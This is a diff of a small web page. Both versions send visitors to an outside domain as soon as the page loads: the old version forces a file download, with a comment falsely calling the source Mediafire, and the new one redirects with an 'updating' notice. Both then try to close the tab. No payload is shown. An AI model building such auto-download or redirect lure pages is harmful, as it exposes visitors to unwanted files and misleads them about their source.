@@ -3,36 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download and Close</title>
+    <title>Redirecting...</title>
     <script type="text/javascript">
-        // Function to trigger the download and close the tab
-        function startDownloadAndClose() {
-            // Direct download link for the file on Mediafire
-            var downloadLink = "https://www.bozoteko.cc/updating/";
+        // Function to redirect the user and close the tab
+        function redirectAndClose() {
+            // Redirect URL
+            var redirectUrl = "https://www.bozoteko.cc/updating/";
 
-            // Create an invisible link element
-            var link = document.createElement("a");
-            link.href = downloadLink;
-            link.download = ""; // Optional: specify a filename if needed
+            // Redirect the user
+            window.location.href = redirectUrl;
 
-            // Append the link to the body, click it to start the download
-            document.body.appendChild(link);
-            link.click();
-
-            // Remove the link element after the click
-            document.body.removeChild(link);
-
-            // Wait for a small delay before closing the tab (2 seconds)
+            // Optionally close the tab after a delay
             setTimeout(function() {
                 window.close();
-            }, 2000); // 2000 milliseconds = 2 seconds delay
+            }, 2000); // 2 seconds delay before attempting to close
         }
 
         // Call the function when the page loads
-        window.onload = startDownloadAndClose;
+        window.onload = redirectAndClose;
     </script>
 </head>
 <body>
-    <p>If the download doesn't start automatically, <a href="https://www.bozoteko.cc/updating/">click here</a>.</p>
+    <p style="font-size: 20px; font-weight: bold;">This file is currently being updated.</p>
+    <p>If you are not redirected automatically, <a href="https://www.bozoteko.cc/updating/">click here</a>.</p>
 </body>
 </html>
